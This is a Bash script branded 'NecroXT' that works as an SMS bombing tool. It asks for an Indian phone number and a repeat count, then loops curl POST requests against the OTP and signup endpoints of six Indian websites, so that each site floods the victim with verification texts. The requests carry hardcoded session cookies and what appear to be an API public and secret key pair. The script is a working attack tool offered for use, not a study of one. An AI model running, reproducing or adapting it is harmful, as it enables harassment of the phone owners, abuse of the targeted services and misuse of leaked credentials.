YELLOW=\\e[33m
BLUE=\\e[34m
CYAN=\\e[36m
GREEN=\\e[32m
RED=\\e[31m
WHITE=\\e[m
echo .
sms_bomb () {
	clear
 echo -e "\e[4;31m NecrO Productions !!! \e[0m"
 echo -e "\e[1;34m Presents \e[0m"
 echo -e "\e[1;32m NecroXT \e[0m"
 echo "Press Enter To Install the requirements"
 read a1
 echo "All Requirements Found...."
 echo .
 echo .
 apt install figlet toilet python curl -y
 apt install python-lzma
 apt install python3-lzma
 apt install python3-pip
 pip3 install urllib3
 pip3 install requests
 echo This Script Was Made By NECRO
 echo Requirements Installed....
 echo Press Enter To Continue...
 read upd
 clear
 echo -e "\e[1;31m"
 figlet The Necro Guy
 echo -e "\e[1;34m Bombing Tool \e[1;32m"
 toilet -f mono12 -F border NecroXT
 echo -e "\e[4;34m This Bomber Was Created By NecrO \e[0m"
 echo -e "\e[1;34m For Any Queries Mail Me!!!\e[0m"
 echo -e "\e[1;32m Mail: necroXTbomber@gmail.com \e[0m"
 echo
 echo -e "\e[1;32m           http://bit.do/TheNecroGuy \e[0m"
 echo -e "\e[4;31m Please Read Instruction Carefully !!! \e[0m"
 echo " "
	echo -e $WHITE
	read -p "Enter phone number without +91:- " phn
	read -p "Enter the number of times you wanna bomb (i bomb = 6 sms):- " nt
	count=0
	clear
	echo bombing...
	until [ $count = $nt ]
	do
		curl -X POST -H "Host:indialends.com" -H "Connection:keep-alive" -H "Content-Length:75" -H "Accept:*/*" -H "Origin:https://indialends.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://indialends.com/personal-loan" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:_ga=GA1.2.1483885314.1559157646; _fbp=fb.1.1559157647161.1989205138; TiPMix=91.9909185226964; gcb_t_track=SEO - Google; gcb_t_keyword=; gcb_t_l_url=https://www.google.com/; gcb_utm_medium=; gcb_utm_campaign=; ASP.NET_SessionId=ioqkek5lbgvldlq4i3cmijcs; web_app_landing_utm_source=; web_app_landing_url=/personal-loan; webapp_landing_referral_url=https://www.google.com/; ARRAffinity=747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417; _gid=GA1.2.969623705.1560660444; _gat=1; current_url=https://indialends.com/personal-loan; cookies_plbt=0" -d 'aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd='$phn'&lj80gertdfg=0' "https://indialends.com/internal/a/mobile-verification_v2.ashx">>.stfu
		sleep 3
		curl -X POST -H "Host:obeycabs.com" -H "Connection:keep-alive" -H "Content-Length:54" -H "aliasName:apporiotaxi" -H "Sec-Fetch-Mode:cors" -H "publicKey:2M1QZnKqLHFIGl5s97wDCkoJruPv3B" -H "locale:en" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36" -H "Access-Control-Allow-Methods:GET,POST,PUT,PATCH,DELETE" -H "Content-Type:application/json" -H "Access-Control-Allow-Origin:*" -H "Accept:application/json" -H "Access-Control-Allow-Credentials:true" -H "secretKey:ZKlxnyC6AiYOmXtNTv0P3ZLVhSQ2JF" -H "Access-Control-Allow-Headers:application/json" -H "Origin:http://obeycabs.com" -H "Sec-Fetch-Site:same-site" -H "Referer:http://obeycabs.com/user_login" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -d '{"user_name":"+91'$phn'","type":"1","for":"PHONE"}' "https://obeycabs.com/taxi/public/api/user/otp">>.stfu
		sleep 3
		curl -X POST -H "Host:api.meddna.com" -H "Connection:keep-alive" -H "Content-Length:127" -H "Accept:application/json, text/plain, */*" -H "Origin:https://www.meddna.com" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36" -H "Content-Type:application/json" -H "Referer:https://www.meddna.com/onboarding/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:_ga=GA1.2.661021598.1564083592; _gid=GA1.2.1653994858.1564083592" -d '{"firstName":"Cncnk","middleName":"","lastName":"","mobileNumber":"'$phn'","type":"patient","countryCode":"+91","email":""}' "https://api.meddna.com/api/onboarding/otp/">>.stfu
		sleep 3
		curl -X POST -H "Host:one.forumias.com" -H "Connection:keep-alive" -H "Content-Length:87" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://one.forumias.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://one.forumias.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:PHPSESSID=ja25ov7gsp8mo772v16u5e7fq7" -d '{"phone":"'$phn'","student_id":28826,"email":"ffmfkfx@ril.com","displayName":"Ro7"}' "https://one.forumias.com/api/v2/verifymobileandsendotp">>.stfu
		sleep 3
		curl -X POST -H "Host:cansell.in" -H "content-length:68" -H "accept:*/*" -H "origin:https://cansell.in" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://cansell.in/giftvoucher?gclid=Cj0KCQjwpPHoBRC3ARIsALfx-_KD-mLrL_V2-eXiZtE8_7o2G6LGBzuOp2LpdN3MVm-vS2_guT7F_uYaAiqJEALw_wcB" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "cookie:.AspNetCore.Antiforgery.vvAbq6O1DT4=CfDJ8LQO3Dm_fRpNpp0HzzLRisb2xqK3zLZ4DBGhNoqVaInOnbZ--m8ZfNR_ZIkmXpt4ZvgN5emuIWIgs2UP6pGXsM4LzOb5Rj_nq1xeltrcY_8cyn6AEmeprinvKO4jQsgB68ezVznceGcixgOOofzGa9A" -H "cookie:_ga=GA1.2.1853665135.1562221356" -H "cookie:_gid=GA1.2.1781264345.1562221356" -H "cookie:_pk_ref.4.5834=%5B%22%22%2C%22%22%2C1562221356%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D" -H "cookie:_pk_ses.4.5834=*" -H "cookie:.AspNetCore.Session=CfDJ8LQO3Dm%2FfRpNpp0HzzLRisaH5be4i25fLVh5SRwDejOdr6jYG35tBEduDw7%2FL62U0AEsk%2BJI6jOGXBZsepkVhTZ3JcRzvMGewVq41PljXDyEHbE0am92WQ5haWAZ3MUsyyuIuv7E%2Bl31lQrkb6dXAMRDSQV20rhhw4uSMLGvRw%2FJ" -H "cookie:_gcl_aw=GCL.1562221370.Cj0KCQjwpPHoBRC3ARIsALfx-_KD-mLrL_V2-eXiZtE8_7o2G6LGBzuOp2LpdN3MVm-vS2_guT7F_uYaAiqJEALw_wcB" -H "cookie:_gac_UA-90103222-1=1.1562221371.Cj0KCQjwpPHoBRC3ARIsALfx-_KD-mLrL_V2-eXiZtE8_7o2G6LGBzuOp2LpdN3MVm-vS2_guT7F_uYaAiqJEALw_wcB" -H "cookie:_pk_id.4.5834=43cc8cd3cbc7dde4.1562221356.1.1562221371.1562221356." -d 'Name=Rox&Email=Rox%40ril.com&Phone='$phn'&Password=Rox%40ril.com' "https://cansell.in/user/signup">>.stfu
		sleep 3
		curl -X POST -H "Host:gaa.edusprint.in" -H "Connection:keep-alive" -H "Content-Length:45" -H "Accept:*/*" -H "Origin:http://gaa.edusprint.in" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded" -H "Referer:http://gaa.edusprint.in/gaa/Home/OpenContactVerificationInsert?QHash=HFXWR6VXSrmWvtdotBtBJw==" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:MCampusTokenID=a9898a16-c5c5-4eaa-af56-9d4922fee12d; YearChangeVerification_StorageYear=0" -d 'ContactNo='$phn'&EmailID=Djdjdk%40ril.com' "http://gaa.edusprint.in/gaa/Home/OpenContactVerificationInsert">>.stfu
		echo $((count++))>>.stfu
	done
}
echo -e $YELLOW && figlet -f slant N3CR0-XT && echo -e "$BLUE SMS + CALL Boomber " && echo -e "$RED Coded by:- N3Cr0 $WHITE"
echo ''
echo 'NOTE:- For indian numbers only. Call bombing and protect list will be available in the next update'
echo ''
read -p 'Press enter to continue...'

sms_bomb